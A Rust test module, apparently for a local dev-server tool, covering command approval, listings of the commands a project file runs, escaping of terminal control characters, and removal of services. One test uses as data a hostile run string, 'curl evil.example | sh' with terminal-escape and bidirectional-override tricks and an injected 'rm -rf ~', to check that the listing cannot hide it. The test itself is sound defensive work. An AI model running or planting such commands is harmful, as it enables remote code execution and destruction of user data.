        assert!(select_starts(&f, &["-x".into()]).is_err());
    }

    #[test]
    fn the_trust_step_needs_a_persons_yes_or_the_flag() {
        use approval::Status::{Approved, Changed, Unapproved};
        for tty in [false, true] {
            // --yes never asks, and always shows what it runs.
            for st in [Approved, Changed, Unapproved] {
                assert_eq!(trust_step(true, st, tty), TrustStep::Yes);
            }
            assert_eq!(trust_step(false, Approved, tty), TrustStep::Approved);
        }
        assert_eq!(trust_step(false, Unapproved, true), TrustStep::Ask);
        assert_eq!(trust_step(false, Changed, true), TrustStep::Ask);
        assert_eq!(
            trust_step(false, Unapproved, false),
            TrustStep::Refuse { changed: false }
        );
        assert_eq!(
            trust_step(false, Changed, false),
            TrustStep::Refuse { changed: true }
        );
    }

    #[test]
    fn the_listing_shows_every_command_as_written() {
        // The SPEC §4.11 example, with an env pair.
        let mut f = file(
            "shop",
            None,
            &[
                ("@", Some(3000)),
                ("api", None),
                ("web", None),
                ("docs", None),
            ],
        );
        let svc = |f: &mut ProjectFile, sub: &str, run: &str| {
            let s = f.services.get_mut(sub).unwrap();
            s.run = run.into();
        };
        svc(&mut f, "@", "npm start");
        svc(&mut f, "api", "cargo run -p api");
        svc(&mut f, "web", "vite --port {port}");
        svc(&mut f, "docs", "mkdocs serve -a 127.0.0.1:{port}");
        f.services.get_mut("api").unwrap().cwd = PathBuf::from("/r/services/api");
        f.services.get_mut("web").unwrap().env = vec![
            ("NODE_ENV".into(), "development".into()),
            ("EMPTY".into(), String::new()),
        ];
        assert_eq!(
            listing(&f),
            format!(
                "/r/lokal.toml runs these commands:\n\
                 \x20 @     npm start\n\
                 \x20 api   {:<32}  in services/api\n\
                 \x20 docs  mkdocs serve -a 127.0.0.1:{{port}}\n\
                 \x20 web   vite --port {{port}}\n\
                 \x20       env NODE_ENV=development\n\
                 \x20       env EMPTY=\n",
                "cargo run -p api"
            )
        );
        // A cwd outside the file's directory is shown as it is; a long
        // command doesn't push `in` past the column.
        let mut f = file("shop", None, &[("a", None), ("b", None)]);
        f.services.get_mut("a").unwrap().cwd = PathBuf::from("/r/../other");
        f.services.get_mut("b").unwrap().cwd = PathBuf::from("/elsewhere");
        f.services.get_mut("b").unwrap().run = "x".repeat(50);
        let l = listing(&f);
        assert!(
            l.contains(&format!("  a  {:<40}  in ../other\n", "run a {port}")),
            "{l}"
        );
        assert!(
            l.contains(&format!("  b  {}  in /elsewhere\n", "x".repeat(50))),
            "{l}"
        );
    }

    /// A file can't make the listing show something other than what runs:
    /// no control character reaches the terminal, and a second line can't
    /// pass for an `env` line.
    #[test]
    fn the_listing_cant_hide_a_command() {
        let mut f = file("shop", None, &[("api", None)]);
        let api = f.services.get_mut("api").unwrap();
        api.run = "curl evil.example | sh\r\x1b[2Knpm start\u{202e}x\nenv X=1 rm -rf ~\n".into();
        api.env = vec![("A\x1b".into(), "1\n2".into())];
        let l = listing(&f);
        assert_eq!(
            l,
            "/r/lokal.toml runs these commands:\n\
             \x20 api  curl evil.example | sh\\r\\u{1b}[2Knpm start\\u{202e}x\n\
             \x20      ↳ env X=1 rm -rf ~\n\
             \x20      env A\\u{1b}=1\n\
             \x20      ↳ 2\n"
        );
        assert!(!l.chars().any(|c| c.is_control() && c != '\n'), "{l:?}");
    }

    #[test]
    fn printable_escapes_what_a_terminal_wouldnt_show() {
        assert_eq!(
            printable("npm start ü → ✓ {port}"),
            "npm start ü → ✓ {port}"
        );
        assert_eq!(printable("a\tb\nc\rd"), "a\\tb\\nc\\rd");
        assert_eq!(
            printable("\x1b\x07\u{7f}\u{85}\u{9b}"),
            "\\u{1b}\\u{7}\\u{7f}\\u{85}\\u{9b}"
        );
        assert_eq!(
            printable("a\u{200b}b\u{202e}c\u{2066}d\u{feff}e\u{ad}f\u{2028}g"),
            "a\\u{200b}b\\u{202e}c\\u{2066}d\\u{feff}e\\u{ad}f\\u{2028}g"
        );
        // A backslash is shown as it is.
        assert_eq!(printable(r"grep 'a\|b'"), r"grep 'a\|b'");
    }

    #[test]
    fn down_removes_only_managed_services() {
        let mut st = state(&[(
            "shop",
            "shop.lokal",
            &[
                ("api", svc(51234, true)),
                ("web", svc(51240, true)),
                ("db", svc(5432, false)),
            ],
        )]);
        st.current_project = Some("shop".into());
        assert_eq!(remove_managed(&mut st, "nope", true), Removal::NoProject);
        // --remove-project keeps a project that still has hand-added services.
        assert_eq!(
            remove_managed(&mut st, "shop", true),
            Removal::Removed {
                domain: "shop.lokal".into(),
                subs: vec!["api".into(), "web".into()],
                gone: vec!["api.shop.lokal".into(), "web.shop.lokal".into()],
                project_removed: false,
                kept: vec!["db".into()],
            }
        );
        assert_eq!(
            st.projects["shop"].services.keys().collect::<Vec<_>>(),
            ["db"]
        );
        // Nothing left to do: say so.
        let before = st.clone();
        assert_eq!(
            remove_managed(&mut st, "shop", false),
            Removal::Nothing {
                kept: vec!["db".into()]
            }
        );
        assert_eq!(st, before);
    }

    #[test]
    fn down_can_remove_the_project_when_nothing_else_is_left() {
        let mut st = state(&[
            ("shop", "shop.lokal", &[("api", svc(51234, true))]),
            ("other", "other.lokal", &[]),
        ]);
        st.current_project = Some("shop".into());
        let r = remove_managed(&mut st, "shop", true);
        assert!(
            matches!(
                r,
                Removal::Removed {
                    project_removed: true,
                    ..
                }
            ),
            "{r:?}"
        );
        assert!(!st.projects.contains_key("shop"));
        assert_eq!(st.current_project, None);
        // An empty project goes too; the current project stays if it's another.
        let mut st = state(&[("shop", "shop.lokal", &[]), ("other", "other.lokal", &[])]);
        st.current_project = Some("other".into());
        let r = remove_managed(&mut st, "shop", true);
        assert!(
            matches!(&r, Removal::Removed { project_removed: true, subs, .. } if subs.is_empty()),
            "{r:?}"
        );
        assert_eq!(st.current_project.as_deref(), Some("other"));
        // Without the flag, an empty project is nothing to do.
        let mut st = state(&[("shop", "shop.lokal", &[])]);
        assert_eq!(
            remove_managed(&mut st, "shop", false),
            Removal::Nothing { kept: vec![] }
        );
    }
}
